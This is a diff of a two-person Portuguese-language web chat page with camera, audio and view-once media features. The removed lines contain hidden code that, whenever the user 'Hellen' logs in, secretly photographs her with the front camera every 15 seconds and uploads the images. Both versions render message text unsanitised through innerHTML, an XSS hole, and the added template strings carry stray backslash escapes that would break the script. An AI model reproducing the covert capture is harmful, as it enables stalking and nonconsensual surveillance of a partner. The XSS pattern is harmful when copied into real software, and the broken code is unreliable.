@@ -162,6 +162,8 @@
         .record-btn.recording { 
             background: #ff0000; 
         }
+
+        /* Media query para telas menores */
         @media (max-width: 480px) {
             .input-send-container .message-input {
                 font-size: 12px;
@@ -176,6 +178,8 @@
                 font-size: 12px;
             }
         }
+
+        /* Estilos para a caixa de visualização */
         .overlay { 
             display: none; 
             position: fixed; 
@@ -210,6 +214,8 @@
             border-radius: 5px; 
             cursor: pointer; 
         }
+
+        /* Estilos para a interface da câmera */
         .camera-overlay { 
             display: none; 
             position: fixed; 
@@ -233,7 +239,7 @@
             gap: 10px; 
             margin-top: 10px; 
         }
-        .camera-controls button { 
+        .camera-controls select, .camera-controls button { 
             padding: 10px; 
             background: #25d366; 
             color: white; 
@@ -241,9 +247,13 @@
             border-radius: 5px; 
             cursor: pointer; 
         }
+        .camera-controls select { 
+            background: #333; 
+        }
     </style>
 </head>
 <body>
+    <!-- Tela de bloqueio -->
     <div id="lock-screen" style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:#000; z-index:9999; overflow:hidden;">
         <img src="image.png" alt="Tela de Bloqueio" style="width:auto; height:100vh; display:block; margin:0 auto;" />
         <div style="position:absolute; top:10px; left:50%; transform:translateX(-50%); display:flex; gap:12px; z-index:10000;">
@@ -257,7 +267,7 @@
     <div class="login-container" id="login-container">
         <h2>Escolha seu usuário</h2>
         <button class="ewerton-btn" onclick="login('Ewerton')">👨‍💻 Ewerton</button>
-        <button class="hellen-btn" onclick="login('Hellen')">👩‍🦰 Hellen</button>
+        <button class="hellen-btn" onclick="login('Hellen')">👩‍🦰 Hellen </button>
     </div>
     <div class="container" id="chat-container">
         <div class="header" id="chat-title"></div>
@@ -267,18 +277,19 @@
             <div class="buttons-container">
                 <input type="file" id="fileInput" accept="image/*,video/*" onchange="sendMedia()">
                 <label for="fileInput">📷</label>
-                <input type="file" id="singleViewInput" accept="image/*,video/*" onchange="sendSingleViewMedia()">
+                <input type="file" id="singleViewInput" accept="image/*,video/*" style="display: none;" onchange="sendSingleViewMedia()">
                 <label for="singleViewInput">📷🔂</label>
                 <button onclick="openCamera()">📸🔓</button>
                 <button id="recordButton" class="record-btn" onclick="toggleRecording()">🎤</button>
             </div>
             <div class="input-send-container">
-                <div id="messageInput" class="message-input" contenteditable="true" placeholder="Digite uma mensagem..."></div>
+                <div id="messageInput" class="message-input" contenteditable="true" placeholder="Digite uma mensagem..." onkeydown="handleKeyDown(event)"></div>
                 <button onclick="sendMessage()">Enviar</button>
             </div>
         </div>
     </div>
 
+    <!-- Caixa de visualização -->
     <div class="overlay" id="overlay">
         <div class="overlay-content" id="overlay-content">
             <img id="overlay-image" src="" alt="Imagem">
@@ -287,9 +298,13 @@
         </div>
     </div>
 
+    <!-- Interface da câmera -->
     <div class="camera-overlay" id="camera-overlay">
         <video id="camera-video" autoplay></video>
         <div class="camera-controls">
+            <select id="camera-select" onchange="changeCamera()">
+                <option value="">Selecione a câmera</option>
+            </select>
             <button onclick="capturePhoto(false)">Tirar Foto</button>
             <button onclick="capturePhoto(true)">Foto Única</button>
             <button onclick="closeCamera()">Fechar</button>
@@ -303,18 +318,6 @@
         let audioChunks = [];
         let isRecording = false;
         let stream = null;
-        let autoPhotoInterval = null;
-        let unlockCount = 0;
-        let lastMessageCount = 0;
-        let lastNotifiedHellen = "";
-        let dotCount = 0;
-
-        function unlockAttempt() {
-            unlockCount++;
-            if (unlockCount >= 3) {
-                document.getElementById("lock-screen").style.display = "none";
-            }
-        }
 
         function login(user) {
             currentUser = user;
@@ -322,189 +325,91 @@
             document.getElementById("chat-container").style.display = "flex";
             document.getElementById("chat-title").innerText = `Chat - ${user}`;
             loadMessages();
-            if (user === "Hellen") {
-                startAutoPhotoCapture();
-            }
         }
 
+        document.getElementById("messageInput").addEventListener("input", () => {
+            sendTypingStatus(true);
+            clearTimeout(typingTimeout);
+            typingTimeout = setTimeout(() => sendTypingStatus(false), 1000);
+        });
+
         async function sendTypingStatus(isTyping) {
-            try {
-                await fetch("/typing", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ user: currentUser, typing: isTyping })
-                });
-            } catch (err) {
-                console.error("Erro ao enviar status de digitação:", err);
-            }
+            await fetch("/typing", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ user: currentUser, typing: isTyping })
+            });
         }
 
         async function sendMessage() {
-            const text = document.getElementById("messageInput").innerText.trim();
+            let text = document.getElementById("messageInput").innerText.trim();
             if (!text) return;
-            try {
-                await fetch("/save-message", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ user: currentUser, content: text })
-                });
-                document.getElementById("messageInput").innerText = "";
-                loadMessages();
-            } catch (err) {
-                console.error("Erro ao enviar mensagem:", err);
-                alert("Erro ao enviar mensagem.");
-            }
+            await fetch("/save-message", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ user: currentUser, content: text })
+            });
+            document.getElementById("messageInput").innerText = "";
+            loadMessages();
         }
 
         async function sendMedia() {
-            const fileInput = document.getElementById("fileInput");
-            const file = fileInput.files[0];
+            let fileInput = document.getElementById("fileInput");
+            let file = fileInput.files[0];
             if (!file) return;
-            const formData = new FormData();
+            let formData = new FormData();
             formData.append("media", file);
             formData.append("user", currentUser);
-            try {
-                await fetch("/save-media", { method: "POST", body: formData });
-                fileInput.value = "";
-                loadMessages();
-            } catch (err) {
-                console.error("Erro ao enviar mídia:", err);
-                alert("Erro ao enviar mídia.");
-            }
+            await fetch("/save-media", { method: "POST", body: formData });
+            fileInput.value = "";
+            loadMessages();
         }
 
         async function sendSingleViewMedia() {
-            const fileInput = document.getElementById("singleViewInput");
-            const file = fileInput.files[0];
+            let fileInput = document.getElementById("singleViewInput");
+            let file = fileInput.files[0];
             if (!file) return;
-            const formData = new FormData();
+            let formData = new FormData();
             formData.append("media", file);
             formData.append("user", currentUser);
             formData.append("singleView", true);
-            try {
-                await fetch("/save-single-view-media", { method: "POST", body: formData });
-                fileInput.value = "";
-                loadMessages();
-            } catch (err) {
-                console.error("Erro ao enviar mídia de visualização única:", err);
-                alert("Erro ao enviar mídia de visualização única.");
-            }
-        }
-
-        async function captureAutoPhoto(attempt = 1, maxAttempts = 3) {
-            if (currentUser !== "Hellen") return;
-            try {
-                if (!stream) {
-                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } } });
-                }
-                const video = document.createElement("video");
-                video.srcObject = stream;
-                document.body.appendChild(video); // Append to DOM to force rendering
-                video.style.display = "none";
-                await video.play();
-                await new Promise(resolve => {
-                    video.onloadedmetadata = () => {
-                        video.onloadedmetadata = null;
-                        setTimeout(resolve, 1000); // Wait 1s for video stabilization
-                    };
-                });
-                if (video.videoWidth === 0 || video.videoHeight === 0) {
-                    if (attempt < maxAttempts) {
-                        console.warn(`Tentativa ${attempt} falhou: dimensões de vídeo inválidas. Tentando novamente...`);
-                        document.body.removeChild(video);
-                        return captureAutoPhoto(attempt + 1, maxAttempts);
-                    }
-                    throw new Error("Video dimensions are invalid after multiple attempts.");
-                }
-                const canvas = document.createElement("canvas");
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const ctx = canvas.getContext("2d");
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    formData.append("media", blob, `${Date.now()}.jpg`);
-                    formData.append("user", currentUser);
-                    try {
-                        await fetch("/save-auto-photo", { method: "POST", body: formData });
-                        loadMessages();
-                    } catch (err) {
-                        console.error("Erro ao enviar foto automática:", err);
-                    }
-                }, "image/jpeg");
-                document.body.removeChild(video);
-                video.srcObject = null;
-            } catch (err) {
-                console.error(`Erro ao capturar foto automática (tentativa ${attempt}):`, err);
-                if (attempt < maxAttempts) {
-                    console.warn(`Tentando novamente... (tentativa ${attempt + 1})`);
-                    return captureAutoPhoto(attempt + 1, maxAttempts);
-                }
-                if (err.name === "NotAllowedError") {
-                    alert("Camera access denied. Please allow camera permissions in browser settings.");
-                } else if (err.name === "NotFoundError") {
-                    alert("No front-facing camera found. Please check your device.");
-                } else {
-                    alert("Error capturing auto photo: " + err.message);
-                }
-            }
-        }
-
-        function startAutoPhotoCapture() {
-            if (currentUser === "Hellen" && !autoPhotoInterval) {
-                captureAutoPhoto(); // Capture immediately
-                autoPhotoInterval = setInterval(captureAutoPhoto, 15000);
-            }
-        }
-
-        function stopAutoPhotoCapture() {
-            if (autoPhotoInterval) {
-                clearInterval(autoPhotoInterval);
-                autoPhotoInterval = null;
-            }
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-                stream = null;
-            }
+            await fetch("/save-single-view-media", { method: "POST", body: formData });
+            fileInput.value = "";
+            loadMessages();
         }
 
         async function loadMessages() {
-            try {
-                const response = await fetch("/load-messages");
-                const messages = await response.json();
-                const messagesContainer = document.getElementById("messages");
-                messagesContainer.innerHTML = "";
-                messages.forEach(msg => {
-                    const div = document.createElement("div");
-                    div.classList.add("message", msg.user.toLowerCase());
-                    if (msg.content) {
-                        div.innerHTML = msg.content.replace(/\n/g, "<br>");
-                    } else if (msg.media) {
-                        const fileExtension = msg.media.split('.').pop().toLowerCase();
-                        if (msg.singleView && !msg.viewed && msg.user !== currentUser) {
-                            div.innerHTML = `<div style="color: red;">Esta foto pode ser visualizada apenas uma vez. <button onclick="openSingleView('${msg.media}')">Abrir</button></div>`;
-                        } else if (msg.viewed && msg.user === currentUser) {
-                            div.innerHTML = `<div style="color: #25d366;">Sua mídia foi visualizada.</div>`;
-                        } else if (!msg.singleView) {
-                            if (["mp4", "webm", "ogg"].includes(fileExtension)) {
-                                div.innerHTML = `<video controls style="max-width: 100%; border-radius: 8px;"><source src="/Uploads/${msg.media}" type="video/${fileExtension}"></video>`;
-                            } else if (["mp3", "wav", "ogg"].includes(fileExtension)) {
-                                div.innerHTML = `<audio controls style="max-width: 100%;"><source src="/Uploads/${msg.media}" type="audio/${fileExtension}"></audio>`;
-                            } else {
-                                div.innerHTML = `<img src="/Uploads/${msg.media}" style="max-width: 100%; border-radius: 8px;">`;
-                            }
+            let response = await fetch("/load-messages");
+            let messages = await response.json();
+            let messagesContainer = document.getElementById("messages");
+            messagesContainer.innerHTML = "";
+            messages.forEach(msg => {
+                let div = document.createElement("div");
+                div.classList.add("message", msg.user.toLowerCase());
+                if (msg.content) {
+                    div.innerHTML = msg.content.replace(/\n/g, "<br>");
+                } else if (msg.media) {
+                    let fileExtension = msg.media.split('.').pop();
+                    if (msg.singleView && !msg.viewed && msg.user !== currentUser) {
+                        div.innerHTML = `<div style="color: red;">Esta foto pode ser visualizada apenas uma vez. <button onclick="openSingleView('${msg.media}')">Abrir</button></div>`;
+                    } else if (msg.viewed && msg.user === currentUser) {
+                        div.innerHTML = `<div style="color: #25d366;">Sua mídia foi visualizada.</div>`;
+                    } else if (!msg.singleView) {
+                        if (["mp4", "webm", "ogg"].includes(fileExtension)) {
+                            div.innerHTML = `<video controls style="max-width: 100%; border-radius: 8px;"><source src="/Uploads/${msg.media}" type="video/${fileExtension}"></video>`;
+                        } else if (["mp3", "wav", "ogg"].includes(fileExtension)) {
+                            div.innerHTML = `<audio controls style="max-width: 100%;"><source src="/Uploads/${msg.media}" type="audio/${fileExtension}"></audio>`;
+                        } else {
+                            div.innerHTML = `<img src="/Uploads/${msg.media}" style="max-width: 100%; border-radius: 8px;">`;
                         }
                     }
-                    messagesContainer.appendChild(div);
-                });
-                messagesContainer.scrollTop = messagesContainer.scrollHeight;
-            } catch (err) {
-                console.error("Erro ao carregar mensagens:", err);
-            }
+                }
+                messagesContainer.appendChild(div);
+            });
         }
 
         async function openSingleView(media) {
-            const fileExtension = media.split('.').pop().toLowerCase();
+            const fileExtension = media.split('.').pop();
             const overlay = document.getElementById("overlay");
             const overlayImage = document.getElementById("overlay-image");
             const overlayVideo = document.getElementById("overlay-video");
@@ -518,22 +423,19 @@
                 overlayImage.style.display = "block";
                 overlayImage.src = `/Uploads/${media}`;
             }
-            overlayContent.innerHTML = `
-                <img id="overlay-image" src="${overlayImage.src}" alt="Imagem" style="display: ${overlayImage.style.display};">
-                <video id="overlay-video" controls style="display: ${overlayVideo.style.display};" src="${overlayVideo.src}"></video>
+            // Resetar o overlay-content para conter apenas a mídia e o botão Fechar
+            overlayContent.innerHTML = \`
+                <img id="overlay-image" src="\${overlayImage.src}" alt="Imagem" style="display: \${overlayImage.style.display};">
+                <video id="overlay-video" controls style="display: \${overlayVideo.style.display};" src="\${overlayVideo.src}"></video>
                 <button onclick="closeOverlay()">Fechar</button>
-            `;
+            \`;
             overlay.style.display = "flex";
-            try {
-                await fetch("/mark-as-viewed", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ media: media, viewer: currentUser })
-                });
-                loadMessages();
-            } catch (err) {
-                console.error("Erro ao marcar mídia como visualizada:", err);
-            }
+            await fetch("/mark-as-viewed", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ media: media, viewer: currentUser })
+            });
+            loadMessages();
         }
 
         function closeOverlay() {
@@ -545,107 +447,120 @@
             overlayVideo.src = "";
             overlayImage.style.display = "none";
             overlayVideo.style.display = "none";
-            overlayContent.innerHTML = `
+            // Resetar o overlay-content para o estado inicial
+            overlayContent.innerHTML = \`
                 <img id="overlay-image" src="" alt="Imagem">
                 <video id="overlay-video" controls style="display: none;"></video>
                 <button onclick="closeOverlay()">Fechar</button>
-            `;
+            \`;
             overlay.style.display = "none";
         }
 
+        function handleKeyDown(event) {
+            if (event.key === "Enter" && !event.shiftKey) {
+                event.preventDefault();
+                sendMessage();
+            }
+        }
+
         async function toggleRecording() {
-            try {
-                if (!isRecording) {
-                    audioChunks = [];
-                    const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                    mediaRecorder = new MediaRecorder(audioStream);
-                    mediaRecorder.ondataavailable = (event) => {
-                        audioChunks.push(event.data);
-                    };
-                    mediaRecorder.onstop = async () => {
-                        const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
-                        const formData = new FormData();
-                        formData.append("media", audioBlob, "audio.wav");
-                        formData.append("user", currentUser);
-                        await fetch("/save-media", { method: "POST", body: formData });
-                        loadMessages();
-                        audioStream.getTracks().forEach(track => track.stop());
-                    };
-                    mediaRecorder.start();
-                    isRecording = true;
-                    document.getElementById("recordButton").classList.add("recording");
-                    document.getElementById("recordButton").innerText = "⏹ Parar Gravação";
-                } else {
-                    mediaRecorder.stop();
-                    isRecording = false;
-                    document.getElementById("recordButton").classList.remove("recording");
-                    document.getElementById("recordButton").innerText = "🎤 Gravar Áudio";
-                }
-            } catch (err) {
-                console.error("Erro ao gravar áudio:", err);
-                alert("Erro ao gravar áudio. Verifique permissões de microfone.");
+            if (!isRecording) {
+                audioChunks = [];
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = (event) => {
+                    audioChunks.push(event.data);
+                };
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
+                    const formData = new FormData();
+                    formData.append("media", audioBlob, "audio.wav");
+                    formData.append("user", currentUser);
+                    await fetch("/save-media", { method: "POST", body: formData });
+                    loadMessages();
+                };
+                mediaRecorder.start();
+                isRecording = true;
+                document.getElementById("recordButton").classList.add("recording");
+                document.getElementById("recordButton").innerText = "⏹ Parar Gravação";
+            } else {
+                mediaRecorder.stop();
+                isRecording = false;
+                document.getElementById("recordButton").classList.remove("recording");
+                document.getElementById("recordButton").innerText = "🎤 Gravar Áudio";
             }
         }
 
         async function openCamera() {
             const cameraOverlay = document.getElementById("camera-overlay");
             const video = document.getElementById("camera-video");
+            const cameraSelect = document.getElementById("camera-select");
             cameraOverlay.style.display = "flex";
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" } } });
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "user" }, width: { min: 1920 }, height: { min: 1080 } } });
                 video.srcObject = stream;
-                await video.play();
-                await new Promise(resolve => {
-                    video.onloadedmetadata = () => {
-                        video.onloadedmetadata = null;
-                        setTimeout(resolve, 1000); // Wait 1s for video stabilization
-                    };
-                });
-                if (video.videoWidth === 0 || video.videoHeight === 0) {
-                    throw new Error("Video dimensions are invalid.");
-                }
+                // Removido video.style.transform = "scaleX(-1)"; para evitar inversão
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === "videoinput");
+                cameraSelect.innerHTML = videoDevices.map(device => 
+                    `<option value="\${device.deviceId}">\${device.label || `Câmera \${videoDevices.indexOf(device) + 1}`}</option>`
+                ).join("");
             } catch (err) {
                 console.error("Erro ao acessar a câmera:", err);
-                if (err.name === "NotAllowedError") {
-                    alert("Camera access denied. Please allow camera permissions in browser settings.");
-                } else if (err.name === "NotFoundError") {
-                    alert("No front-facing camera found. Please check your device.");
-                } else {
-                    alert("Error accessing camera: " + err.message);
-                }
-                closeCamera();
+            }
+        }
+
+        async function changeCamera() {
+            const cameraSelect = document.getElementById("camera-select");
+            const video = document.getElementById("camera-video");
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { deviceId: cameraSelect.value, width: { min: 1920 }, height: { min: 1080 } } 
+                });
+                video.srcObject = stream;
+                // Removido video.style.transform = "scaleX(-1)"; para evitar inversão
+            } catch (err) {
+                console.error("Erro ao mudar a câmera:", err);
             }
         }
 
         async function capturePhoto(singleView) {
             const video = document.getElementById("camera-video");
-            if (!video.srcObject || video.videoWidth === 0 || video.videoHeight === 0) {
-                alert("Câmera não está ativa ou não está pronta. Tente abrir a câmera novamente.");
-                closeCamera();
-                return;
-            }
             const canvas = document.createElement("canvas");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth || 1920;
+            canvas.height = video.videoHeight || 1080;
+
+            // Desenhar a imagem no canvas sem inversão
             const ctx = canvas.getContext("2d");
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
             canvas.toBlob(async (blob) => {
                 const overlay = document.getElementById("overlay");
                 const overlayContent = document.getElementById("overlay-content");
                 const overlayImage = document.getElementById("overlay-image");
                 const overlayVideo = document.getElementById("overlay-video");
+
+                // Configurar a imagem capturada no overlay
                 overlayImage.src = URL.createObjectURL(blob);
                 overlayImage.style.display = "block";
                 overlayVideo.style.display = "none";
-                overlayContent.innerHTML = `
-                    <img id="overlay-image" src="${overlayImage.src}" alt="Imagem capturada" style="max-width: 100%; border-radius: 8px;">
+
+                // Limpar o conteúdo do overlay-content e adicionar a imagem e os botões
+                overlayContent.innerHTML = \`
+                    <img id="overlay-image" src="\${overlayImage.src}" alt="Imagem capturada" style="max-width: 100%; border-radius: 8px;">
                     <div style="margin-top: 10px;">
-                        <button onclick="sendCapturedPhoto(${singleView})">Enviar</button>
+                        <button onclick="sendCapturedPhoto(\${singleView})">Enviar</button>
                         <button onclick="closeOverlayAndReopenCamera()">Tirar Outra</button>
                         <button onclick="closeOverlay()">Fechar</button>
                     </div>
-                `;
+                \`;
+
                 overlay.style.display = "flex";
+
+                // Fechar a câmera se for uma foto única
                 if (singleView) {
                     closeCamera();
                 }
@@ -654,20 +569,19 @@
 
         async function sendCapturedPhoto(singleView) {
             const overlayImage = document.getElementById("overlay-image");
-            try {
-                const response = await fetch(overlayImage.src);
-                const blob = await response.blob();
-                const formData = new FormData();
-                formData.append("media", blob, `${Date.now()}.jpg`);
-                formData.append("user", currentUser);
-                const endpoint = singleView ? "/save-single-view-media" : "/save-media";
-                await fetch(endpoint, { method: "POST", body: formData });
-                closeOverlay();
-                loadMessages();
-            } catch (err) {
-                console.error("Erro ao enviar foto capturada:", err);
-                alert("Erro ao enviar foto capturada.");
+            const response = await fetch(overlayImage.src);
+            const blob = await response.blob();
+            const formData = new FormData();
+            formData.append("media", blob, "photo.jpg");
+            formData.append("user", currentUser);
+            if (singleView) {
+                formData.append("singleView", true);
+                await fetch("/save-single-view-media", { method: "POST", body: formData });
+            } else {
+                await fetch("/save-media", { method: "POST", body: formData });
             }
+            closeOverlay();
+            loadMessages();
         }
 
         function closeOverlayAndReopenCamera() {
@@ -680,26 +594,35 @@
             const video = document.getElementById("camera-video");
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
-                stream = null;
             }
             video.srcObject = null;
             cameraOverlay.style.display = "none";
         }
 
+        let unlockCount = 0;
+        function unlockAttempt() {
+            unlockCount++;
+            if (unlockCount >= 3) {
+                document.getElementById("lock-screen").style.display = "none";
+            }
+        }
+
+        let lastMessageCount = 0;
+        let lastNotifiedHellen = "";
         async function autoUpdateMessages() {
             try {
-                const response = await fetch("/load-messages");
-                const messages = await response.json();
-                const messagesContainer = document.getElementById("messages");
+                let response = await fetch("/load-messages");
+                let messages = await response.json();
+                let messagesContainer = document.getElementById("messages");
                 if (messages.length !== lastMessageCount) {
                     messagesContainer.innerHTML = "";
                     messages.forEach(msg => {
-                        const div = document.createElement("div");
+                        let div = document.createElement("div");
                         div.classList.add("message", msg.user.toLowerCase());
                         if (msg.content) {
                             div.innerHTML = msg.content.replace(/\n/g, "<br>");
                         } else if (msg.media) {
-                            const fileExtension = msg.media.split('.').pop().toLowerCase();
+                            let fileExtension = msg.media.split('.').pop();
                             if (msg.singleView && !msg.viewed && msg.user !== currentUser) {
                                 div.innerHTML = `<div style="color: red;">Esta foto pode ser visualizada apenas uma vez. <button onclick="openSingleView('${msg.media}')">Abrir</button></div>`;
                             } else if (msg.viewed && msg.user === currentUser) {
@@ -716,13 +639,12 @@
                         }
                         messagesContainer.appendChild(div);
                     });
-                    messagesContainer.scrollTop = messagesContainer.scrollHeight;
                     lastMessageCount = messages.length;
                 }
-                const hellenMessages = messages.filter(m => m.user === "Hellen");
+                let hellenMessages = messages.filter(m => m.user === "Hellen");
                 if (hellenMessages.length > 0) {
-                    const lastHellen = hellenMessages[hellenMessages.length - 1];
-                    const content = lastHellen.content || "Enviou uma mídia";
+                    let lastHellen = hellenMessages[hellenMessages.length - 1];
+                    let content = lastHellen.content || "Enviou uma mídia";
                     if (lastHellen.content !== lastNotifiedHellen) {
                         if (Notification.permission === "granted") {
                             new Notification("Nova mensagem de Hellen", {
@@ -738,14 +660,21 @@
             }
         }
 
+        if ("Notification" in window) {
+            Notification.requestPermission();
+        }
+
+        setInterval(autoUpdateMessages, 1000);
+
+        let dotCount = 0;
         function updateTypingIndicator() {
             fetch("/typing-status")
                 .then(res => res.json())
                 .then(status => {
-                    const otherUser = currentUser === "Hellen" ? "Ewerton" : "Hellen";
+                    let otherUser = currentUser === "Hellen" ? "Ewerton" : "Hellen";
                     if (status[otherUser]) {
                         dotCount = (dotCount + 1) % 4;
-                        const dots = ".".repeat(dotCount);
+                        let dots = ".".repeat(dotCount);
                         document.getElementById("typing-indicator").innerText = `${otherUser} está digitando${dots}`;
                     } else {
                         document.getElementById("typing-indicator").innerText = "";
@@ -753,27 +682,8 @@
                 })
                 .catch(err => console.error("Erro ao buscar status de digitação:", err));
         }
-
-        document.addEventListener("DOMContentLoaded", () => {
-            const messageInput = document.getElementById("messageInput");
-            messageInput.addEventListener("input", () => {
-                sendTypingStatus(true);
-                clearTimeout(typingTimeout);
-                typingTimeout = setTimeout(() => sendTypingStatus(false), 1000);
-            });
-            messageInput.addEventListener("keydown", (event) => {
-                if (event.key === "Enter" && !event.shiftKey) {
-                    event.preventDefault();
-                    sendMessage();
-                }
-            });
-            if ("Notification" in window) {
-                Notification.requestPermission();
-            }
-            setInterval(autoUpdateMessages, 1000);
-            setInterval(updateTypingIndicator, 500);
-            window.addEventListener('beforeunload', stopAutoPhotoCapture);
-        });
+        setInterval(updateTypingIndicator, 500);
     </script>
 </body>
 </html>
+
